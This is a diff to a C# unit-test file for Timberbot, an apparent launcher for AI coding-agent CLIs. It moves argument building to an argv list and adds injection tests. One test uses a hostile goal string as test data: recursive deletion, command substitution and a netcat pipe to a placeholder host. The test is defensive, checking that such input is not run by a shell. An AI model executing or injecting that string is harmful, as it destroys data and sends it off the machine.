@@ -394,40 +394,6 @@ namespace Timberbot.Tests
         public void NotANumber_ReturnsFallback() => Assert.Equal("10", TimberbotPure.NormalizeIntString("abc", 10, 0));
     }
 
-    public class IsAllowedBinaryTests
-    {
-        [Theory]
-        [InlineData("claude", true)]
-        [InlineData("Claude", true)]
-        [InlineData("CLAUDE", true)]
-        [InlineData("claude.exe", true)]
-        [InlineData("codex", true)]
-        [InlineData("codex.exe", true)]
-        [InlineData("notepad", false)]
-        [InlineData("cmd", false)]
-        [InlineData("powershell", false)]
-        [InlineData("", false)]
-        [InlineData(null, false)]
-        [InlineData("  claude  ", true)]
-        public void BuiltinBinaries(string binary, bool expected) =>
-            Assert.Equal(expected, TimberbotPure.IsAllowedBinary(binary, null));
-
-        [Fact]
-        public void CustomAllowlist_Allowed()
-        {
-            var extra = new System.Collections.Generic.HashSet<string>(System.StringComparer.OrdinalIgnoreCase) { "mybot" };
-            Assert.True(TimberbotPure.IsAllowedBinary("mybot", extra));
-            Assert.True(TimberbotPure.IsAllowedBinary("mybot.exe", extra));
-        }
-
-        [Fact]
-        public void CustomAllowlist_StillBlocksOthers()
-        {
-            var extra = new System.Collections.Generic.HashSet<string>(System.StringComparer.OrdinalIgnoreCase) { "mybot" };
-            Assert.False(TimberbotPure.IsAllowedBinary("notepad", extra));
-        }
-    }
-
     public class ValidateWebhookUrlFormatTests
     {
         [Fact]
@@ -623,48 +589,56 @@ namespace Timberbot.Tests
         }
     }
 
-    public class BuildTbotAgentRunArgsTests
+    public class BuildTbotAgentRunArgvTests
     {
-        // Minimal invocation: just backend + goal.
+        // Minimal invocation: just backend + goal. Argv is exact — no shell quoting
+        // hazard because the spawn uses ProcessStartInfo.ArgumentList.
         [Fact]
         public void Minimal_BackendAndGoal()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: "reach 50 beavers",
-                model: null, effort: null, commandTemplate: null, terminalPrefix: null);
-            Assert.Equal("agent run --backend \"claude\" --goal \"reach 50 beavers\"", args);
+                model: null, effort: null, commandTemplate: null);
+            Assert.Equal(
+                new[] { "agent", "run", "--backend", "claude", "--goal", "reach 50 beavers" },
+                argv);
         }
 
         // Null backend falls back to "claude" (matches the legacy TimberbotAgent default).
         [Fact]
         public void NullBackend_DefaultsToClaude()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: null, goal: "x",
-                model: null, effort: null, commandTemplate: null, terminalPrefix: null);
-            Assert.Contains("--backend \"claude\"", args);
+                model: null, effort: null, commandTemplate: null);
+            int idx = argv.IndexOf("--backend");
+            Assert.True(idx >= 0);
+            Assert.Equal("claude", argv[idx + 1]);
         }
 
-        // Null goal is rendered as an empty quoted string so the Python CLI errors out
+        // Null goal becomes an empty string argv entry so the Python CLI errors out
         // with a clear "--goal is required" message instead of mis-parsing.
         [Fact]
-        public void NullGoal_RendersEmptyQuotedString()
+        public void NullGoal_RendersEmptyArgvEntry()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: null,
-                model: null, effort: null, commandTemplate: null, terminalPrefix: null);
-            Assert.Contains("--goal \"\"", args);
+                model: null, effort: null, commandTemplate: null);
+            int idx = argv.IndexOf("--goal");
+            Assert.True(idx >= 0);
+            Assert.Equal("", argv[idx + 1]);
         }
 
         [Fact]
         public void ModelAndEffort_AppendedWhenSet()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: "g",
-                model: "claude-haiku-4-5", effort: "high",
-                commandTemplate: null, terminalPrefix: null);
-            Assert.Contains("--model \"claude-haiku-4-5\"", args);
-            Assert.Contains("--effort \"high\"", args);
+                model: "claude-haiku-4-5", effort: "high", commandTemplate: null);
+            int m = argv.IndexOf("--model");
+            int e = argv.IndexOf("--effort");
+            Assert.Equal("claude-haiku-4-5", argv[m + 1]);
+            Assert.Equal("high", argv[e + 1]);
         }
 
         // Empty (vs null) optional flags are still skipped — matches the legacy
@@ -672,60 +646,64 @@ namespace Timberbot.Tests
         [Fact]
         public void EmptyOptionalFlags_AreSkipped()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: "g",
-                model: "", effort: "", commandTemplate: "", terminalPrefix: "");
-            Assert.DoesNotContain("--model", args);
-            Assert.DoesNotContain("--effort", args);
-            Assert.DoesNotContain("--command", args);
-            Assert.DoesNotContain("--terminal-prefix", args);
+                model: "", effort: "", commandTemplate: "");
+            Assert.DoesNotContain("--model", argv);
+            Assert.DoesNotContain("--effort", argv);
+            Assert.DoesNotContain("--command", argv);
         }
 
-        // Custom backend with a template — the template itself goes through the
-        // standard QuoteArg, so it survives the round-trip even with spaces.
+        // Custom backend with a template — the template lands in a single argv
+        // entry, so even spaces and braces survive verbatim.
         [Fact]
-        public void CustomTemplate_IsQuoted()
+        public void CustomTemplate_IsSingleArgvEntry()
         {
             var template = "aider --system-prompt-file {skill} {prompt}";
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "custom", goal: "g",
-                model: null, effort: null, commandTemplate: template, terminalPrefix: null);
-            Assert.Contains("--command \"aider --system-prompt-file {skill} {prompt}\"", args);
+                model: null, effort: null, commandTemplate: template);
+            int c = argv.IndexOf("--command");
+            Assert.Equal(template, argv[c + 1]);
         }
 
-        // Windows Terminal launch prefix with a {cwd} placeholder. The placeholder
-        // is substituted on the Python side; here we just check it round-trips
-        // through QuoteArg unmodified.
+        // Goal containing embedded double-quotes survives unchanged in argv —
+        // the whole point of UseShellExecute=false + ArgumentList.
         [Fact]
-        public void TerminalPrefix_RoundTripsThroughQuoteArg()
+        public void GoalWithDoubleQuotes_SurvivesIntact()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
-                backend: "claude", goal: "g",
-                model: null, effort: null,
-                commandTemplate: null, terminalPrefix: "wt -d {cwd} --");
-            Assert.Contains("--terminal-prefix \"wt -d {cwd} --\"", args);
-        }
-
-        // Goal containing embedded double-quotes must be backslash-escaped (per
-        // the QuoteArg contract) so the shell sees the right argv on the other end.
-        [Fact]
-        public void GoalWithDoubleQuotes_IsEscaped()
-        {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: "say \"hi\" to beavers",
-                model: null, effort: null, commandTemplate: null, terminalPrefix: null);
-            Assert.Contains("--goal \"say \\\"hi\\\" to beavers\"", args);
+                model: null, effort: null, commandTemplate: null);
+            int g = argv.IndexOf("--goal");
+            Assert.Equal("say \"hi\" to beavers", argv[g + 1]);
         }
 
-        // Backslash in a path-shaped arg must also be escaped.
+        // Shell metacharacters in the goal must not be interpreted. With
+        // UseShellExecute=false they're just bytes in an argv entry; this test
+        // captures that contract.
         [Fact]
-        public void TemplateWithBackslash_IsEscaped()
+        public void GoalWithShellMetacharacters_SurvivesIntact()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var goal = "rm -rf $(echo evil) `whoami` | nc bad.example.com 80";
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
+                backend: "claude", goal: goal,
+                model: null, effort: null, commandTemplate: null);
+            int g = argv.IndexOf("--goal");
+            Assert.Equal(goal, argv[g + 1]);
+        }
+
+        // Backslashes in a path-shaped arg are preserved (no escaping needed —
+        // argv entries are opaque strings to the OS exec interface).
+        [Fact]
+        public void TemplateWithBackslash_SurvivesIntact()
+        {
+            var template = @"C:\bin\aider --prompt {prompt}";
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "custom", goal: "g",
-                model: null, effort: null,
-                commandTemplate: @"C:\bin\aider --prompt {prompt}", terminalPrefix: null);
-            Assert.Contains(@"--command ""C:\\bin\\aider --prompt {prompt}""", args);
+                model: null, effort: null, commandTemplate: template);
+            int c = argv.IndexOf("--command");
+            Assert.Equal(template, argv[c + 1]);
         }
 
         // The argv always starts with `agent run` so the Python CLI's
@@ -733,32 +711,56 @@ namespace Timberbot.Tests
         [Fact]
         public void ArgsAlwaysStartWithAgentRun()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "opencode", goal: "g",
-                model: "x", effort: "y", commandTemplate: null, terminalPrefix: null);
-            Assert.StartsWith("agent run ", args);
+                model: "x", effort: "y", commandTemplate: null);
+            Assert.Equal("agent", argv[0]);
+            Assert.Equal("run", argv[1]);
         }
 
-        // Argument order matches the Python CLI's argparse - backend, goal, then
+        // Argument order matches the Python CLI's argparse — backend, goal, then
         // optional flags in declaration order. This ordering is stable contract:
         // both sides of the wire depend on it.
         [Fact]
         public void ArgumentOrder_IsBackendGoalThenOptionals()
         {
-            var args = TimberbotPure.BuildTbotAgentRunArgs(
+            var argv = TimberbotPure.BuildTbotAgentRunArgv(
                 backend: "claude", goal: "g",
-                model: "m", effort: "e", commandTemplate: "t", terminalPrefix: "p");
-            int backend = args.IndexOf("--backend");
-            int goal = args.IndexOf("--goal");
-            int model = args.IndexOf("--model");
-            int effort = args.IndexOf("--effort");
-            int command = args.IndexOf("--command");
-            int terminal = args.IndexOf("--terminal-prefix");
+                model: "m", effort: "e", commandTemplate: "t");
+            int backend = argv.IndexOf("--backend");
+            int goal = argv.IndexOf("--goal");
+            int model = argv.IndexOf("--model");
+            int effort = argv.IndexOf("--effort");
+            int command = argv.IndexOf("--command");
             Assert.True(backend < goal);
             Assert.True(goal < model);
             Assert.True(model < effort);
             Assert.True(effort < command);
-            Assert.True(command < terminal);
+        }
+    }
+
+    public class FormatArgvForDisplayTests
+    {
+        [Fact]
+        public void EmptyArgv_ReturnsEmptyString() =>
+            Assert.Equal("", TimberbotPure.FormatArgvForDisplay(new System.Collections.Generic.List<string>()));
+
+        [Fact]
+        public void NullArgv_ReturnsEmptyString() =>
+            Assert.Equal("", TimberbotPure.FormatArgvForDisplay(null));
+
+        [Fact]
+        public void SimpleArgs_RenderedSpaceSeparated()
+        {
+            var argv = new System.Collections.Generic.List<string> { "agent", "run", "--backend", "claude" };
+            Assert.Equal("agent run --backend claude", TimberbotPure.FormatArgvForDisplay(argv));
+        }
+
+        [Fact]
+        public void ArgsWithSpaces_AreQuoted()
+        {
+            var argv = new System.Collections.Generic.List<string> { "agent", "run", "--goal", "reach 50 beavers" };
+            Assert.Equal("agent run --goal \"reach 50 beavers\"", TimberbotPure.FormatArgvForDisplay(argv));
         }
     }
 }
